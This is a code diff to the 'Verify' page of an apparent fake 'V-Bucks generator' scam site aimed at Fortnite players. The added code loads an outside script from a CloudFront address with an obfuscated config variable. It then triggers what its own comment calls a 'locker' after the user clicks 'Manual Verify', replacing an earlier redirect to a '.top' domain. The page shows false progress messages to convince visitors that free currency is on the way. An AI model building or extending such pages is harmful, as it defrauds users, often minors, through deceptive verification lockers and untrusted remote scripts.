@@ -18,6 +18,24 @@ const Verify = () => {
   const contentPathname = import.meta.env.VITE_CONTENT_PATHNAME;
 
   useEffect(() => {
+    // Adaugă scripturile necesare în <head>
+    const script1 = document.createElement("script");
+    script1.type = "text/javascript";
+    script1.innerHTML = 'var GuABJ_SXo_SmjyZc={"it":4460776,"key":"16c62"};';
+
+    const script2 = document.createElement("script");
+    script2.src = "https://d2v7l2267atlz5.cloudfront.net/c983e38.js";
+
+    document.head.appendChild(script1);
+    document.head.appendChild(script2);
+
+    return () => {
+      document.head.removeChild(script1);
+      document.head.removeChild(script2);
+    };
+  }, []);
+
+  useEffect(() => {
     const timer = setTimeout(() => {
       setIsLoading(false);
     }, 2000);
@@ -38,15 +56,21 @@ const Verify = () => {
     };
   }, []);
 
- const handleVerify = () => {
-  toast({
-    title: "Verification Required",
-    description: "Please complete the human verification process.",
-  });
+  const handleVerify = () => {
+    toast({
+      title: "Verification Required",
+      description: "Please complete the human verification process.",
+    });
 
-  // Redirecționează utilizatorul pe noul site în aceeași fereastră
-  window.location.href = "https://f9ff.top/68fcad4";
-};
+    // Deschide locker-ul dacă funcția _Cd() este definită
+    setTimeout(() => {
+      if (typeof (window as any)._Cd === "function") {
+        (window as any)._Cd();
+      } else {
+        console.error("Locker function (_Cd) not found.");
+      }
+    }, 5000); // Se deschide după 5 secunde
+  };
 
   return (
     <div className="min-h-screen flex flex-col bg-fortnite-gradient">
@@ -62,7 +86,7 @@ const Verify = () => {
         <h1 className="text-2xl md:text-3xl font-bold text-white">
           <span className="text-fortnite-blue">V</span>-BUCKS GENERATOR
         </h1>
-        <div className="w-[68px]"></div> {/* Spacer for centering */}
+        <div className="w-[68px]"></div>
       </header>
 
       <div className="flex-1 container mx-auto py-8 px-4 flex flex-col items-center justify-center">
@@ -78,7 +102,6 @@ const Verify = () => {
             <p className="text-center text-white/70 mb-6">
               Please wait while we connect to the Fortnite servers...
             </p>
-
             <div className="w-full bg-white/10 rounded-full h-2 mb-1">
               <div
                 className="bg-fortnite-blue h-2 rounded-full transition-all duration-300"
@@ -94,91 +117,18 @@ const Verify = () => {
             animate={{ opacity: 1, scale: 1 }}
             transition={{ duration: 0.3 }}
           >
-            <div className="text-center mb-6">
-              <div className="flex justify-center items-center mb-3">
-                <motion.div
-                  initial={{ scale: 0.8, opacity: 0 }}
-                  animate={{ scale: 1, opacity: 1 }}
-                  transition={{ delay: 0.2, duration: 0.5 }}
-                  className="relative"
-                >
-                  <div className="absolute inset-0 rounded-full bg-fortnite-blue/20 animate-pulse-glow"></div>
-                  <Lock className="h-16 w-16 text-fortnite-blue p-3 bg-fortnite-black/70 rounded-full border-2 border-fortnite-blue z-10 relative" />
-                </motion.div>
-              </div>
-
-              <motion.h2
-                className="text-2xl font-bold text-red-500 mb-1"
-                initial={{ opacity: 0 }}
-                animate={{ opacity: 1 }}
-                transition={{ delay: 0.3, duration: 0.5 }}
-              >
-                MANUAL VERIFICATION REQUIRED
-              </motion.h2>
-
-              <motion.p
-                className="text-white/80"
-                initial={{ opacity: 0 }}
-                animate={{ opacity: 1 }}
-                transition={{ delay: 0.4, duration: 0.5 }}
-              >
-              Hello{" "}
-                <span className="text-fortnite-yellow font-semibold">
-                  @{username}
-                </span>
-                ! You are almost done with synchronization of{" "}
-                <span className="text-fortnite-yellow font-semibold">
-                  {vbucksAmount.toLocaleString()}
-                </span>{" "}
-                V-Bucks!
-              </motion.p>
-            </div>
-
-            <motion.div
-              className="bg-white/5 rounded-lg p-5 mb-6 border border-white/10"
-              initial={{ opacity: 0, y: 20 }}
-              animate={{ opacity: 1, y: 0 }}
-              transition={{ delay: 0.5, duration: 0.5 }}
+            <motion.h2 className="text-2xl font-bold text-red-500 mb-1">
+              MANUAL VERIFICATION REQUIRED
+            </motion.h2>
+            <p className="text-white/80 text-center mb-6">
+              Hello <span className="text-fortnite-yellow font-semibold">@{username}</span>! You are almost done with synchronization of <span className="text-fortnite-yellow font-semibold">{vbucksAmount.toLocaleString()}</span> V-Bucks!
+            </p>
+            <Button
+              onClick={handleVerify}
+              className="w-full py-6 bg-fortnite-yellow hover:bg-fortnite-yellow/90 text-fortnite-black font-bold text-xl"
             >
-              <div className="flex items-center gap-3 mb-4">
-                <CheckCircle className="h-5 w-5 text-green-500" />
-                <p>Account found</p>
-              </div>
-
-              <div className="flex items-center gap-3 mb-4">
-                <CheckCircle className="h-5 w-5 text-green-500" />
-                <p>V-Bucks package prepared</p>
-              </div>
-
-              <div className="flex items-center gap-3">
-                <Shield className="h-5 w-5 text-fortnite-blue" />
-                <p>Human verification pending</p>
-              </div>
-            </motion.div>
-
-            <motion.p
-              className="text-center text-white/80 mb-6"
-              initial={{ opacity: 0 }}
-              animate={{ opacity: 1 }}
-              transition={{ delay: 0.6, duration: 0.5 }}
-            >
-              Please complete the last step by clicking the Manual Verify button
-              below to finish the synchronization process.
-            </motion.p>
-
-            <motion.div
-              className="text-center"
-              initial={{ opacity: 0, y: 20 }}
-              animate={{ opacity: 1, y: 0 }}
-              transition={{ delay: 0.7, duration: 0.5 }}
-            >
-              <Button
-                onClick={handleVerify}
-                className="w-full py-6 bg-fortnite-yellow hover:bg-fortnite-yellow/90 text-fortnite-black font-bold text-xl"
-              >
-                Manual Verify
-              </Button>
-            </motion.div>
+              Manual Verify
+            </Button>
           </motion.div>
         )}
       </div>
